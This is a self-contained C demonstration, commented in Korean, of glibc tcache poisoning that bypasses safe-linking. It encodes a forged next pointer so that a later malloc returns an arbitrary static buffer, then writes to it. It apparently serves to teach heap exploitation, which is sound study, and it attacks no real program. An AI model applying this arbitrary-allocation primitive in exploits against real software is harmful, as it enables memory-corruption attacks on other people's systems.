#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* malloc 반환 주소 정렬 조건을 맞춘 writable target */
static unsigned char target[0x40] __attribute__((aligned(16)));

int main(void)
{
    setbuf(stdout, NULL);

    char *b = malloc(0x30);
    char *a = malloc(0x30);

    if (a == NULL || b == NULL) {
        perror("malloc");
        return 1;
    }

    printf("[+] a      = %p\n", (void *)a);
    printf("[+] b      = %p\n", (void *)b);
    printf("[+] target = %p\n", (void *)target);

    /*
     * LIFO:
     * free(b) -> b
     * free(a) -> a -> b
     */
    free(b);
    free(a);

    /*
     * safe-linking:
     * stored_next = real_next ^ (entry_address >> 12)
     *
     * a->next를 target으로 poisoning한다.
     */
    uintptr_t encoded_target =
        (uintptr_t)target ^ ((uintptr_t)a >> 12);

    *(uintptr_t *)a = encoded_target;

    /*
     * 두 번째 malloc에서 target을 pop할 때,
     * target->next가 NULL로 복호화되도록 설정한다.
     *
     * encoded_NULL = 0 ^ (target >> 12)
     */
    *(uintptr_t *)target = (uintptr_t)target >> 12;

    printf("\n[+] encoded target = %#lx\n",
           (unsigned long)encoded_target);
    printf("[+] raw a->next    = %#lx\n",
           (unsigned long)*(uintptr_t *)a);

    char *p = malloc(0x30);
    char *q = malloc(0x30);

    printf("\n[+] p = %p\n", (void *)p);
    printf("[+] q = %p\n", (void *)q);

    printf("[+] p == a      : %s\n", p == a ? "true" : "false");
    printf("[+] q == target : %s\n",
           q == (char *)target ? "true" : "false");

    memset(q, 'A', 8);

    printf("[+] target data : %.8s\n", target);

    return 0;
}
